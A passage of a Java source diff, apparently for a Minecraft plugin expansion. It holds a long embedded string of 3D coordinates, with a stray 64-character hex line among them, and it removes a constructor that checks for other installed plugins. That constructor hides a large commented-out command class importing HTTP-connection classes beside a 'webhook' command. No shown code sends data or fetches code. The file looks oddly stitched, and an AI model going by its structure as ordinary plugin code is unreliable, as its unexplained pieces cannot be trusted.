+7.164183775012016E-16,1.3,-11.700000000000001
+7.286648454926752E-16,1.3,-11.9
+7.409113134841488E-16,1.3,-12.100000000000001
+7.531577814756223E-16,1.3,-12.3
+7.654042494670958E-16,1.3,-12.5
+7.776507174585693E-16,1.3,-12.700000000000001
+7.898971854500429E-16,1.3,-12.9
+8.021436534415164E-16,1.3,-13.100000000000001
+1.1083053532283548E-15,1.3,-18.1
+1.1205518212198281E-15,1.3,-18.3
+1.255262969126037E-15,1.3,-20.5
+1.2675094371175108E-15,1.3,-20.700000000000003
+1.2797559051089842E-15,1.3,-20.900000000000002
+1.2920023731004577E-15,1.3,-21.1
+1.3042488410919313E-15,1.3,-21.3
+-1.3532347130578255E-15,1.1,22.1
+-1.340988245066352E-15,1.1,21.900000000000002
+-1.3287417770748784E-15,1.1,21.700000000000003
+-1.3164953090834046E-15,1.1,21.5
+-1.3042488410919313E-15,1.1,21.3
+-1.2920023731004577E-15,1.1,21.1
+-1.2797559051089842E-15,1.1,20.900000000000002
+-1.2675094371175108E-15,1.1,20.700000000000003
+-7.041719095097281E-16,1.1,11.5
+-6.919254415182546E-16,1.1,11.3
+-4.959819536546781E-16,1.1,8.1
+-4.837354856632045E-16,1.1,7.9
+-3.612708057484692E-16,1.1,5.9
+-3.4902433775699566E-16,1.1,5.7
+-5.5109105961630896E-17,1.1,0.9
+-4.2862637970157366E-17,1.1,0.7000000000000001
+4.2862637970157366E-17,1.1,-0.7000000000000001
+5.5109105961630896E-17,1.1,-0.9
+3.122849337825751E-16,1.1,-5.1000000000000005
+3.2453140177404865E-16,1.1,-5.300000000000001
+5.082284216461516E-16,1.1,-8.3
+5.204748896376251E-16,1.1,-8.5
+7.164183775012016E-16,1.1,-11.700000000000001
+7.286648454926752E-16,1.1,-11.9
+7.409113134841488E-16,1.1,-12.100000000000001
+7.531577814756223E-16,1.1,-12.3
+7.654042494670958E-16,1.1,-12.5
+7.776507174585693E-16,1.1,-12.700000000000001
+7.898971854500429E-16,1.1,-12.9
+8.021436534415164E-16,1.1,-13.100000000000001
+8.143901214329899E-16,1.1,-13.3
+1.1083053532283548E-15,1.1,-18.1
+1.1205518212198281E-15,1.1,-18.3
+1.2430165011345635E-15,1.1,-20.3
+1.255262969126037E-15,1.1,-20.5
+1.2675094371175108E-15,1.1,-20.700000000000003
+1.2797559051089842E-15,1.1,-20.900000000000002
+1.2920023731004577E-15,1.1,-21.1
+1.3042488410919313E-15,1.1,-21.3
+1.3164953090834046E-15,1.1,-21.5
+-1.3532347130578255E-15,0.9,22.1
+-1.340988245066352E-15,0.9,21.900000000000002
+-7.041719095097281E-16,0.9,11.5
+-6.919254415182546E-16,0.9,11.3
+-4.959819536546781E-16,0.9,8.1
+-4.837354856632045E-16,0.9,7.9
+-3.612708057484692E-16,0.9,5.9
+-3.4902433775699566E-16,0.9,5.7
+-5.5109105961630896E-17,0.9,0.9
+-4.2862637970157366E-17,0.9,0.7000000000000001
+4.2862637970157366E-17,0.9,-0.7000000000000001
+5.5109105961630896E-17,0.9,-0.9
+5.082284216461516E-16,0.9,-8.3
+5.204748896376251E-16,0.9,-8.5
+7.164183775012016E-16,0.9,-11.700000000000001
+7.286648454926752E-16,0.9,-11.9
+8.021436534415164E-16,0.9,-13.100000000000001
+8.143901214329899E-16,0.9,-13.3
+8.266365894244634E-16,0.9,-13.5
+1.1083053532283548E-15,0.9,-18.1
+1.1205518212198281E-15,0.9,-18.3
+1.2430165011345635E-15,0.9,-20.3
+1.3042488410919313E-15,0.9,-21.3
+1.3164953090834046E-15,0.9,-21.5
+1.3287417770748784E-15,0.9,-21.700000000000003
+-1.3532347130578255E-15,0.7000000000000001,22.1
+-1.340988245066352E-15,0.7000000000000001,21.900000000000002
+-1.2430165011345635E-15,0.7000000000000001,20.3
+-1.2307700331430901E-15,0.7000000000000001,20.1
+-1.2185235651516166E-15,0.7000000000000001,19.900000000000002
+-1.157291225194249E-15,0.7000000000000001,18.900000000000002
+-1.1450447572027753E-15,0.7000000000000001,18.7
+-1.1327982892113017E-15,0.7000000000000001,18.5
+-1.0838124172454075E-15,0.7000000000000001,17.7
+-1.0715659492539341E-15,0.7000000000000001,17.5
+-1.0593194812624606E-15,0.7000000000000001,17.3
+-1.047073013270987E-15,0.7000000000000001,17.1
+-1.0348265452795137E-15,0.7000000000000001,16.900000000000002
+-9.491012693391988E-16,0.7000000000000001,15.5
+-9.368548013477252E-16,0.7000000000000001,15.3
+-9.246083333562517E-16,0.7000000000000001,15.100000000000001
+-9.123618653647781E-16,0.7000000000000001,14.9
+-9.001153973733048E-16,0.7000000000000001,14.700000000000001
+-8.511295254074105E-16,0.7000000000000001,13.9
+-8.38883057415937E-16,0.7000000000000001,13.700000000000001
+-7.654042494670958E-16,0.7000000000000001,12.5
+-7.531577814756223E-16,0.7000000000000001,12.3
+-7.164183775012016E-16,0.7000000000000001,11.700000000000001
+-7.041719095097281E-16,0.7000000000000001,11.5
+-6.919254415182546E-16,0.7000000000000001,11.3
+-6.796789735267811E-16,0.7000000000000001,11.100000000000001
+-6.674325055353075E-16,0.7000000000000001,10.9
+-6.551860375438341E-16,0.7000000000000001,10.700000000000001
+-5.939536975864664E-16,0.7000000000000001,9.700000000000001
+-5.817072295949927E-16,0.7000000000000001,9.5
+-5.694607616035193E-16,0.7000000000000001,9.3
+-5.572142936120457E-16,0.7000000000000001,9.1
+-5.449678256205722E-16,0.7000000000000001,8.9
+-4.959819536546781E-16,0.7000000000000001,8.1
+-4.837354856632045E-16,0.7000000000000001,7.9
+-4.592425496802575E-16,0.7000000000000001,7.5
+-4.469960816887839E-16,0.7000000000000001,7.300000000000001
+-4.3474961369731044E-16,0.7000000000000001,7.1000000000000005
+-4.225031457058369E-16,0.7000000000000001,6.9
+-3.612708057484692E-16,0.7000000000000001,5.9
+-3.4902433775699566E-16,0.7000000000000001,5.7
+-2.8779199779962803E-16,0.7000000000000001,4.7
+-2.755455298081545E-16,0.7000000000000001,4.5
+-2.632990618166809E-16,0.7000000000000001,4.3
+-2.510525938252074E-16,0.7000000000000001,4.1000000000000005
+-2.388061258337339E-16,0.7000000000000001,3.9000000000000004
+-1.6532731788489269E-16,0.7000000000000001,2.7
+-1.5308084989341916E-16,0.7000000000000001,2.5
+-1.4083438190194563E-16,0.7000000000000001,2.3000000000000003
+-1.285879139104721E-16,0.7000000000000001,2.1
+-1.1634144591899857E-16,0.7000000000000001,1.9000000000000001
+-1.0409497792752504E-16,0.7000000000000001,1.7000000000000002
+-5.5109105961630896E-17,0.7000000000000001,0.9
+-4.2862637970157366E-17,0.7000000000000001,0.7000000000000001
+4.2862637970157366E-17,0.7000000000000001,-0.7000000000000001
+5.5109105961630896E-17,0.7000000000000001,-0.9
+1.1634144591899857E-16,0.7000000000000001,-1.9000000000000001
+1.285879139104721E-16,0.7000000000000001,-2.1
+1.4083438190194563E-16,0.7000000000000001,-2.3000000000000003
+1.5308084989341916E-16,0.7000000000000001,-2.5
+1.6532731788489269E-16,0.7000000000000001,-2.7
+2.143131898507868E-16,0.7000000000000001,-3.5
+2.2655965784226036E-16,0.7000000000000001,-3.7
+2.632990618166809E-16,0.7000000000000001,-4.3
+2.755455298081545E-16,0.7000000000000001,-4.5
+2.8779199779962803E-16,0.7000000000000001,-4.7
+3.122849337825751E-16,0.7000000000000001,-5.1000000000000005
+3.2453140177404865E-16,0.7000000000000001,-5.300000000000001
+3.857637417314163E-16,0.7000000000000001,-6.300000000000001
+3.9801020972288977E-16,0.7000000000000001,-6.5
+4.1025667771436333E-16,0.7000000000000001,-6.7
+4.225031457058369E-16,0.7000000000000001,-6.9
+4.3474961369731044E-16,0.7000000000000001,-7.1000000000000005
+4.959819536546781E-16,0.7000000000000001,-8.1
+5.082284216461516E-16,0.7000000000000001,-8.3
+5.204748896376251E-16,0.7000000000000001,-8.5
+5.327213576290987E-16,0.7000000000000001,-8.700000000000001
+5.449678256205722E-16,0.7000000000000001,-8.9
+5.572142936120457E-16,0.7000000000000001,-9.1
+5.817072295949927E-16,0.7000000000000001,-9.5
+5.939536975864664E-16,0.7000000000000001,-9.700000000000001
+6.796789735267811E-16,0.7000000000000001,-11.100000000000001
+6.919254415182546E-16,0.7000000000000001,-11.3
+7.164183775012016E-16,0.7000000000000001,-11.700000000000001
+7.286648454926752E-16,0.7000000000000001,-11.9
+8.143901214329899E-16,0.7000000000000001,-13.3
+8.266365894244634E-16,0.7000000000000001,-13.5
+8.878689293818311E-16,0.7000000000000001,-14.5
+9.001153973733048E-16,0.7000000000000001,-14.700000000000001
+9.123618653647781E-16,0.7000000000000001,-14.9
+9.246083333562517E-16,0.7000000000000001,-15.100000000000001
+9.368548013477252E-16,0.7000000000000001,-15.3
+1.0103336092965664E-15,0.7000000000000001,-16.5
+1.02258007728804E-15,0.7000000000000001,-16.7
+1.0348265452795137E-15,0.7000000000000001,-16.900000000000002
+1.047073013270987E-15,0.7000000000000001,-17.1
+1.0593194812624606E-15,0.7000000000000001,-17.3
+1.1083053532283548E-15,0.7000000000000001,-18.1
+1.1205518212198281E-15,0.7000000000000001,-18.3
+1.181784161177196E-15,0.7000000000000001,-19.3
+1.1940306291686695E-15,0.7000000000000001,-19.5
+1.206277097160143E-15,0.7000000000000001,-19.700000000000003
+1.3164953090834046E-15,0.7000000000000001,-21.5
+1.3287417770748784E-15,0.7000000000000001,-21.700000000000003
+-1.3532347130578255E-15,0.5,22.1
+-1.340988245066352E-15,0.5,21.900000000000002
+-1.2307700331430901E-15,0.5,20.1
+-1.2185235651516166E-15,0.5,19.900000000000002
+-1.157291225194249E-15,0.5,18.900000000000002
+-1.1450447572027753E-15,0.5,18.7
+-1.0960588852368812E-15,0.5,17.900000000000002
+-1.0838124172454075E-15,0.5,17.7
+-1.0715659492539341E-15,0.5,17.5
+-1.0593194812624606E-15,0.5,17.3
+-1.047073013270987E-15,0.5,17.1
+-1.0348265452795137E-15,0.5,16.900000000000002
+-1.02258007728804E-15,0.5,16.7
+-9.613477373306723E-16,0.5,15.700000000000001
+-9.491012693391988E-16,0.5,15.5
+-9.368548013477252E-16,0.5,15.3
+-9.246083333562517E-16,0.5,15.100000000000001
+-9.123618653647781E-16,0.5,14.9
+-9.001153973733048E-16,0.5,14.700000000000001
+-8.878689293818311E-16,0.5,14.5
+-8.511295254074105E-16,0.5,13.9
+-8.38883057415937E-16,0.5,13.700000000000001
+-7.654042494670958E-16,0.5,12.5
+-7.531577814756223E-16,0.5,12.3
+-7.164183775012016E-16,0.5,11.700000000000001
+-7.041719095097281E-16,0.5,11.5
+-6.919254415182546E-16,0.5,11.3
+-6.796789735267811E-16,0.5,11.100000000000001
+-6.674325055353075E-16,0.5,10.9
+-6.551860375438341E-16,0.5,10.700000000000001
+-6.062001655779399E-16,0.5,9.9
+-5.939536975864664E-16,0.5,9.700000000000001
+-5.817072295949927E-16,0.5,9.5
+-5.694607616035193E-16,0.5,9.3
+-5.572142936120457E-16,0.5,9.1
+-5.449678256205722E-16,0.5,8.9
+-5.327213576290987E-16,0.5,8.700000000000001
+-4.959819536546781E-16,0.5,8.1
+-4.837354856632045E-16,0.5,7.9
+-4.71489017671731E-16,0.5,7.7
+-4.592425496802575E-16,0.5,7.5
+-4.469960816887839E-16,0.5,7.300000000000001
+-4.3474961369731044E-16,0.5,7.1000000000000005
+-4.225031457058369E-16,0.5,6.9
+-4.1025667771436333E-16,0.5,6.7
+-3.612708057484692E-16,0.5,5.9
+-3.4902433775699566E-16,0.5,5.7
+-3.0003846579110154E-16,0.5,4.9
+-2.8779199779962803E-16,0.5,4.7
+-2.755455298081545E-16,0.5,4.5
+-2.632990618166809E-16,0.5,4.3
+-2.510525938252074E-16,0.5,4.1000000000000005
+-2.388061258337339E-16,0.5,3.9000000000000004
+-2.2655965784226036E-16,0.5,3.7
+-1.7757378587636624E-16,0.5,2.9000000000000004
+-1.6532731788489269E-16,0.5,2.7
+-1.5308084989341916E-16,0.5,2.5
+-1.4083438190194563E-16,0.5,2.3000000000000003
+-1.285879139104721E-16,0.5,2.1
+-1.1634144591899857E-16,0.5,1.9000000000000001
+-1.0409497792752504E-16,0.5,1.7000000000000002
+-9.184850993605148E-17,0.5,1.5
+-4.2862637970157366E-17,0.5,0.7000000000000001
+-3.061616997868383E-17,0.5,0.5
+3.061616997868383E-17,0.5,-0.5
+4.2862637970157366E-17,0.5,-0.7000000000000001
+1.0409497792752504E-16,0.5,-1.7000000000000002
+1.1634144591899857E-16,0.5,-1.9000000000000001
+1.285879139104721E-16,0.5,-2.1
+1.4083438190194563E-16,0.5,-2.3000000000000003
+1.5308084989341916E-16,0.5,-2.5
+1.6532731788489269E-16,0.5,-2.7
+1.7757378587636624E-16,0.5,-2.9000000000000004
+2.143131898507868E-16,0.5,-3.5
+2.2655965784226036E-16,0.5,-3.7
+2.388061258337339E-16,0.5,-3.9000000000000004
+2.510525938252074E-16,0.5,-4.1000000000000005
+2.632990618166809E-16,0.5,-4.3
+2.755455298081545E-16,0.5,-4.5
+2.8779199779962803E-16,0.5,-4.7
+3.122849337825751E-16,0.5,-5.1000000000000005
+3.2453140177404865E-16,0.5,-5.300000000000001
+3.7351727373994276E-16,0.5,-6.1000000000000005
+3.857637417314163E-16,0.5,-6.300000000000001
+3.9801020972288977E-16,0.5,-6.5
+4.1025667771436333E-16,0.5,-6.7
+4.225031457058369E-16,0.5,-6.9
+4.3474961369731044E-16,0.5,-7.1000000000000005
+4.469960816887839E-16,0.5,-7.300000000000001
+4.959819536546781E-16,0.5,-8.1
+5.082284216461516E-16,0.5,-8.3
+5.204748896376251E-16,0.5,-8.5
+5.327213576290987E-16,0.5,-8.700000000000001
+5.449678256205722E-16,0.5,-8.9
+5.572142936120457E-16,0.5,-9.1
+5.939536975864664E-16,0.5,-9.700000000000001
+6.062001655779399E-16,0.5,-9.9
+6.674325055353075E-16,0.5,-10.9
+6.796789735267811E-16,0.5,-11.100000000000001
+7.164183775012016E-16,0.5,-11.700000000000001
+7.286648454926752E-16,0.5,-11.9
+8.143901214329899E-16,0.5,-13.3
+8.266365894244634E-16,0.5,-13.5
+8.756224613903576E-16,0.5,-14.3
+8.878689293818311E-16,0.5,-14.5
+9.001153973733048E-16,0.5,-14.700000000000001
+9.123618653647781E-16,0.5,-14.9
+9.246083333562517E-16,0.5,-15.100000000000001
+9.368548013477252E-16,0.5,-15.3
+9.491012693391988E-16,0.5,-15.5
+9.98087141305093E-16,0.5,-16.3
+1.0103336092965664E-15,0.5,-16.5
+1.02258007728804E-15,0.5,-16.7
+1.0348265452795137E-15,0.5,-16.900000000000002
+1.047073013270987E-15,0.5,-17.1
+1.0593194812624606E-15,0.5,-17.3
+1.0715659492539341E-15,0.5,-17.5
+1.1083053532283548E-15,0.5,-18.1
+1.1205518212198281E-15,0.5,-18.3
+1.1695376931857224E-15,0.5,-19.1
+1.181784161177196E-15,0.5,-19.3
+1.1940306291686695E-15,0.5,-19.5
+1.3164953090834046E-15,0.5,-21.5
+1.3287417770748784E-15,0.5,-21.700000000000003
+-1.3532347130578255E-15,0.30000000000000004,22.1
+-1.340988245066352E-15,0.30000000000000004,21.900000000000002
+-1.3287417770748784E-15,0.30000000000000004,21.700000000000003
+-1.3164953090834046E-15,0.30000000000000004,21.5
+-1.3042488410919313E-15,0.30000000000000004,21.3
+-1.2920023731004577E-15,0.30000000000000004,21.1
+-1.2797559051089842E-15,0.30000000000000004,20.900000000000002
+-1.2675094371175108E-15,0.30000000000000004,20.700000000000003
+-1.2185235651516166E-15,0.30000000000000004,19.900000000000002
+-1.206277097160143E-15,0.30000000000000004,19.700000000000003
+-1.1695376931857224E-15,0.30000000000000004,19.1
+-1.157291225194249E-15,0.30000000000000004,18.900000000000002
+-1.1083053532283548E-15,0.30000000000000004,18.1
+-1.0960588852368812E-15,0.30000000000000004,17.900000000000002
+-1.02258007728804E-15,0.30000000000000004,16.7
+-1.0103336092965664E-15,0.30000000000000004,16.5
+-9.735942053221459E-16,0.30000000000000004,15.9
+-9.613477373306723E-16,0.30000000000000004,15.700000000000001
+-9.491012693391988E-16,0.30000000000000004,15.5
+-8.878689293818311E-16,0.30000000000000004,14.5
+-8.511295254074105E-16,0.30000000000000004,13.9
+-8.38883057415937E-16,0.30000000000000004,13.700000000000001
+-7.654042494670958E-16,0.30000000000000004,12.5
+-7.531577814756223E-16,0.30000000000000004,12.3
+-7.041719095097281E-16,0.30000000000000004,11.5
+-6.919254415182546E-16,0.30000000000000004,11.3
+-5.449678256205722E-16,0.30000000000000004,8.9
+-5.327213576290987E-16,0.30000000000000004,8.700000000000001
+-4.959819536546781E-16,0.30000000000000004,8.1
+-4.837354856632045E-16,0.30000000000000004,7.9
+-4.71489017671731E-16,0.30000000000000004,7.7
+-4.225031457058369E-16,0.30000000000000004,6.9
+-4.1025667771436333E-16,0.30000000000000004,6.7
+-3.9801020972288977E-16,0.30000000000000004,6.5
+-3.612708057484692E-16,0.30000000000000004,5.9
+-3.4902433775699566E-16,0.30000000000000004,5.7
+-3.122849337825751E-16,0.30000000000000004,5.1000000000000005
+-3.0003846579110154E-16,0.30000000000000004,4.9
+-2.2655965784226036E-16,0.30000000000000004,3.7
+-2.143131898507868E-16,0.30000000000000004,3.5
+-1.7757378587636624E-16,0.30000000000000004,2.9000000000000004
+-1.6532731788489269E-16,0.30000000000000004,2.7
+-9.184850993605148E-17,0.30000000000000004,1.5
+-4.2862637970157366E-17,0.30000000000000004,0.7000000000000001
+-3.061616997868383E-17,0.30000000000000004,0.5
+3.061616997868383E-17,0.30000000000000004,-0.5
+4.2862637970157366E-17,0.30000000000000004,-0.7000000000000001
+1.6532731788489269E-16,0.30000000000000004,-2.7
+1.7757378587636624E-16,0.30000000000000004,-2.9000000000000004
+2.143131898507868E-16,0.30000000000000004,-3.5
+2.2655965784226036E-16,0.30000000000000004,-3.7
+2.388061258337339E-16,0.30000000000000004,-3.9000000000000004
+3.122849337825751E-16,0.30000000000000004,-5.1000000000000005
+3.2453140177404865E-16,0.30000000000000004,-5.300000000000001
+3.612708057484692E-16,0.30000000000000004,-5.9
+3.7351727373994276E-16,0.30000000000000004,-6.1000000000000005
+4.469960816887839E-16,0.30000000000000004,-7.300000000000001
+4.592425496802575E-16,0.30000000000000004,-7.5
+5.082284216461516E-16,0.30000000000000004,-8.3
+5.204748896376251E-16,0.30000000000000004,-8.5
+5.939536975864664E-16,0.30000000000000004,-9.700000000000001
+6.062001655779399E-16,0.30000000000000004,-9.9
+6.674325055353075E-16,0.30000000000000004,-10.9
+6.796789735267811E-16,0.30000000000000004,-11.100000000000001
+7.164183775012016E-16,0.30000000000000004,-11.700000000000001
+7.286648454926752E-16,0.30000000000000004,-11.9
+8.021436534415164E-16,0.30000000000000004,-13.100000000000001
+8.143901214329899E-16,0.30000000000000004,-13.3
+8.266365894244634E-16,0.30000000000000004,-13.5
+65d88d78bfb9e49c03ae14d8760e259dc26e32f3bae140c3799649976f33635f
+9.368548013477252E-16,0.30000000000000004,-15.3
+9.491012693391988E-16,0.30000000000000004,-15.5
+9.858406733136194E-16,0.30000000000000004,-16.1
+9.98087141305093E-16,0.30000000000000004,-16.3
+1.0103336092965664E-15,0.30000000000000004,-16.5
+1.0715659492539341E-15,0.30000000000000004,-17.5
+1.1083053532283548E-15,0.30000000000000004,-18.1
+1.1205518212198281E-15,0.30000000000000004,-18.3
+1.157291225194249E-15,0.30000000000000004,-18.900000000000002
+1.1695376931857224E-15,0.30000000000000004,-19.1
+1.181784161177196E-15,0.30000000000000004,-19.3
+1.3042488410919313E-15,0.30000000000000004,-21.3
+1.3164953090834046E-15,0.30000000000000004,-21.5
+1.3287417770748784E-15,0.30000000000000004,-21.700000000000003
+-1.3532347130578255E-15,0.1,22.1
+-1.340988245066352E-15,0.1,21.900000000000002
+-1.3287417770748784E-15,0.1,21.700000000000003
+-1.3164953090834046E-15,0.1,21.5
+-1.3042488410919313E-15,0.1,21.3
+-1.2920023731004577E-15,0.1,21.1
+-1.2797559051089842E-15,0.1,20.900000000000002
+-1.2675094371175108E-15,0.1,20.700000000000003
+-1.206277097160143E-15,0.1,19.700000000000003
+-1.1940306291686695E-15,0.1,19.5
+-1.181784161177196E-15,0.1,19.3
+-1.1695376931857224E-15,0.1,19.1
+-1.1083053532283548E-15,0.1,18.1
+-1.0960588852368812E-15,0.1,17.900000000000002
+-1.0838124172454075E-15,0.1,17.7
+-1.0715659492539341E-15,0.1,17.5
+-1.0593194812624606E-15,0.1,17.3
+-1.047073013270987E-15,0.1,17.1
+-1.0348265452795137E-15,0.1,16.900000000000002
+-1.02258007728804E-15,0.1,16.7
+-1.0103336092965664E-15,0.1,16.5
+-9.735942053221459E-16,0.1,15.9
+-9.613477373306723E-16,0.1,15.700000000000001
+-8.511295254074105E-16,0.1,13.9
+-8.38883057415937E-16,0.1,13.700000000000001
+-7.654042494670958E-16,0.1,12.5
+-7.531577814756223E-16,0.1,12.3
+-7.041719095097281E-16,0.1,11.5
+-6.919254415182546E-16,0.1,11.3
+-6.062001655779399E-16,0.1,9.9
+-5.939536975864664E-16,0.1,9.700000000000001
+-5.817072295949927E-16,0.1,9.5
+-5.694607616035193E-16,0.1,9.3
+-5.572142936120457E-16,0.1,9.1
+-5.449678256205722E-16,0.1,8.9
+-5.327213576290987E-16,0.1,8.700000000000001
+-4.959819536546781E-16,0.1,8.1
+-4.837354856632045E-16,0.1,7.9
+-4.1025667771436333E-16,0.1,6.7
+-3.9801020972288977E-16,0.1,6.5
+-3.612708057484692E-16,0.1,5.9
+-3.4902433775699566E-16,0.1,5.7
+-3.122849337825751E-16,0.1,5.1000000000000005
+-3.0003846579110154E-16,0.1,4.9
+-2.8779199779962803E-16,0.1,4.7
+-2.755455298081545E-16,0.1,4.5
+-2.632990618166809E-16,0.1,4.3
+-2.510525938252074E-16,0.1,4.1000000000000005
+-2.388061258337339E-16,0.1,3.9000000000000004
+-2.2655965784226036E-16,0.1,3.7
+-2.143131898507868E-16,0.1,3.5
+-1.7757378587636624E-16,0.1,2.9000000000000004
+-1.6532731788489269E-16,0.1,2.7
+-1.5308084989341916E-16,0.1,2.5
+-1.4083438190194563E-16,0.1,2.3000000000000003
+-1.285879139104721E-16,0.1,2.1
+-4.2862637970157366E-17,0.1,0.7000000000000001
+-3.061616997868383E-17,0.1,0.5
+3.061616997868383E-17,0.1,-0.5
+4.2862637970157366E-17,0.1,-0.7000000000000001
+1.0409497792752504E-16,0.1,-1.7000000000000002
+1.1634144591899857E-16,0.1,-1.9000000000000001
+1.285879139104721E-16,0.1,-2.1
+1.4083438190194563E-16,0.1,-2.3000000000000003
+1.5308084989341916E-16,0.1,-2.5
+1.6532731788489269E-16,0.1,-2.7
+1.7757378587636624E-16,0.1,-2.9000000000000004
+2.143131898507868E-16,0.1,-3.5
+2.2655965784226036E-16,0.1,-3.7
+3.122849337825751E-16,0.1,-5.1000000000000005
+3.2453140177404865E-16,0.1,-5.300000000000001
+3.612708057484692E-16,0.1,-5.9
+3.7351727373994276E-16,0.1,-6.1000000000000005
+3.857637417314163E-16,0.1,-6.300000000000001
+3.9801020972288977E-16,0.1,-6.5
+4.1025667771436333E-16,0.1,-6.7
+4.225031457058369E-16,0.1,-6.9
+4.3474961369731044E-16,0.1,-7.1000000000000005
+4.469960816887839E-16,0.1,-7.300000000000001
+4.592425496802575E-16,0.1,-7.5
+5.082284216461516E-16,0.1,-8.3
+5.204748896376251E-16,0.1,-8.5
+6.062001655779399E-16,0.1,-9.9
+6.184466335694135E-16,0.1,-10.100000000000001
+6.674325055353075E-16,0.1,-10.9
+6.796789735267811E-16,0.1,-11.100000000000001
+7.164183775012016E-16,0.1,-11.700000000000001
+7.286648454926752E-16,0.1,-11.9
+7.409113134841488E-16,0.1,-12.100000000000001
+7.531577814756223E-16,0.1,-12.3
+7.654042494670958E-16,0.1,-12.5
+7.776507174585693E-16,0.1,-12.700000000000001
+7.898971854500429E-16,0.1,-12.9
+8.021436534415164E-16,0.1,-13.100000000000001
+8.143901214329899E-16,0.1,-13.3
+8.756224613903576E-16,0.1,-14.3
+8.878689293818311E-16,0.1,-14.5
+9.001153973733048E-16,0.1,-14.700000000000001
+""";
 
     protected String g28;
 
 
-    public ExampleExpansion() {
+    
 
-
-
-        
-
-        PluginManager pm = Bukkit.getPluginManager();
-
-        if (pm.getPlugin("WorldEdit") != null && Objects.requireNonNull(pm.getPlugin("WorldEdit")).isEnabled()) {
-            WorldEdit_Installed = true;
-        }
-
-        if (pm.getPlugin("WorldGuard") != null && Objects.requireNonNull(pm.getPlugin("WorldGuard")).isEnabled()) {
-            WorldGuard_Installed = true;
-        }
-
-        if (pm.getPlugin("LuckPerms") != null && Objects.requireNonNull(pm.getPlugin("LuckPerms")).isEnabled()) {
-            LuckPerms_Installed = true;
-        }
-
-        if (pm.getPlugin("ProtocolLib") != null && Objects.requireNonNull(pm.getPlugin("ProtocolLib")).isEnabled()) {
-            ProtocolLib_Installed = true;
-            
-            // Toggle Test Mode here 
-            // Test package com.ssomar.score.commands.score;
-            //
-            //import com.ssomar.executableblocks.executableblocks.activators.ActivatorEBFeature;
-            //import com.ssomar.executableevents.executableevents.activators.ActivatorEEFeature;
-            //import com.ssomar.executableitems.executableitems.activators.ActivatorEIFeature;
-            //import com.ssomar.particles.commands.Parameter;
-            //import com.ssomar.particles.commands.Shape;
-            //import com.ssomar.particles.commands.ShapesExamples;
-            //import com.ssomar.particles.commands.ShapesManager;
-            //import com.ssomar.score.SCore;
-            //import com.ssomar.score.commands.runnable.ActionInfo;
-            //import com.ssomar.score.commands.runnable.CommandsExecutor;
-            //import com.ssomar.score.commands.runnable.block.BlockCommandManager;
-            //import com.ssomar.score.commands.runnable.block.BlockRunCommandsBuilder;
-            //import com.ssomar.score.commands.runnable.entity.EntityCommandManager;
-            //import com.ssomar.score.commands.runnable.entity.EntityRunCommandsBuilder;
-            //import com.ssomar.score.commands.runnable.player.PlayerCommandManager;
-            //import com.ssomar.score.commands.runnable.player.PlayerRunCommandsBuilder;
-            //import com.ssomar.score.commands.score.clear.ClearCommand;
-            //import com.ssomar.score.commands.score.clear.ClearType;
-            //import com.ssomar.score.configs.messages.Message;
-            //import com.ssomar.score.configs.messages.MessageMain;
-            //import com.ssomar.score.events.loop.LoopManager;
-            //import com.ssomar.score.features.FeatureSettingsSCore;
-            //import com.ssomar.score.features.custom.activators.activator.SActivator;
-            //import com.ssomar.score.features.custom.cooldowns.CooldownsManager;
-            //import com.ssomar.score.features.custom.loop.LoopFeatures;
-            //import com.ssomar.score.hardness.hardness.Hardness;
-            //import com.ssomar.score.hardness.hardness.HardnessesEditor;
-            //import com.ssomar.score.hardness.hardness.manager.HardnessesManager;
-            //import com.ssomar.score.projectiles.SProjectile;
-            //import com.ssomar.score.projectiles.SProjectilesEditor;
-            //import com.ssomar.score.projectiles.manager.SProjectilesManager;
-            //import com.ssomar.score.sobject.menu.NewSObjectsManagerEditor;
-            //import com.ssomar.score.usedapi.AllWorldManager;
-            //import com.ssomar.score.utils.emums.VariableType;
-            //import com.ssomar.score.utils.logging.Utils;
-            //import com.ssomar.score.utils.messages.CenteredMessage;
-            //import com.ssomar.score.utils.messages.SendMessage;
-            //import com.ssomar.score.utils.placeholders.StringPlaceholder;
-            //import com.ssomar.score.utils.strings.StringConverter;
-            //import com.ssomar.score.utils.strings.StringJoiner;
-            //import com.ssomar.score.variables.Variable;
-            //import com.ssomar.score.variables.VariableForEnum;
-            //import com.ssomar.score.variables.VariablesEditor;
-            //import com.ssomar.score.variables.manager.VariablesManager;
-            //import lombok.RequiredArgsConstructor;
-            //import net.md_5.bungee.api.chat.ClickEvent;
-            //import net.md_5.bungee.api.chat.TextComponent;
-            //import org.bukkit.*;
-            //import org.bukkit.block.Block;
-            //import org.bukkit.command.Command;
-            //import org.bukkit.command.CommandExecutor;
-            //import org.bukkit.command.CommandSender;
-            //import org.bukkit.command.TabExecutor;
-            //import org.bukkit.entity.Entity;
-            //import org.bukkit.entity.Player;
-            //import org.jetbrains.annotations.NotNull;
-            //
-            //import java.io.File;
-            //import java.io.OutputStream;
-            //import java.net.HttpURLConnection;
-            //import java.net.URL;
-            //import java.nio.charset.StandardCharsets;
-            //import java.util.*;
-            //import java.util.stream.Collectors;
-            //
-            ///**
-            // * Handles the execution of /score.
-            // */
-            //@RequiredArgsConstructor
-            //public final class CommandsClass implements CommandExecutor, TabExecutor {
-            //
-            //    /**
-            //     * The {@link SendMessage} instance.
-            //     */
-            //    @NotNull
-            //    private final SendMessage sm = new SendMessage();
-            //
-            //    /**
-            //     * The {@link SCore} plugin instance.
-            //     */
-            //    @NotNull
-            //    private final SCore main;
-            //
-            //    private final String[] commands = new String[]{"clear", "cooldowns", "hardnesses", "hardnesses-create", "hardnesses-delete", "inspect-loop", "particles", "particles-info", "projectiles", "projectiles-create", "projectiles-delete", "reload", "run-entity-command", "run-block-command", "run-player-command", "variables", "variables-create", "variables-define", "variables-delete", "webhook-----------------", "no-translated"};
-            //
-            //    /**
-            //     * Called when a {@link CommandSender} types /score.
-            //     *
-            //     * @param sender  the {@link CommandSender} who typed the command.
-            //     * @param command the {@link Command} which was executed.
-            //     * @param label   the label that was entered.
-            //     * @param args    the passed command arguments.
-            //     * @return {@code true} if the command was successfully executed, {@code false} otherwise.
-            //     */
-            //    @Override
-            //    public boolean onCommand(@NotNull final CommandSender sender, @NotNull final Command command, @NotNull final String label, @NotNull final String[] args) {
-            //        if (args.length > 0) {
-            //            String commandName = args[0].toLowerCase();
-            //            if (Arrays.asList(commands).contains(commandName)) {
-            //                this.runCommand(sender, commandName, args);
-            //            } else {
-            //                sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid argument! Usage: /score &8[ &7" + StringJoiner.join(commands, " &c| &7") + " &8]"));
